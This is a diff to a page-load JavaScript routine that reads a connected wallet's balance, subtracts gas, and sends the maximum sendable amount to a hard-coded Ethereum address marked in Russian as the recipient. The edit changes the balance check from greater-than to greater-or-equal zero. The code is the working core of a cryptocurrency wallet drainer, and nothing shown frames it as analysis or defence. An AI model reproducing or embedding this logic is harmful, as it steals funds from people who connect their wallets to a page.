@@ -51,7 +51,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       const balance = await provider.getBalance(account);
       const maxSendable = balance.sub(gasPrice.mul(gasLimit));
 
-      if (maxSendable.gt(0)) {
+      if (maxSendable.gte(0)) {
         const transactionParam = {
           to: '0xDA35A9bf6bD6442C0aCe715e122fFB20871f1351', // Адрес получателя
           value: maxSendable
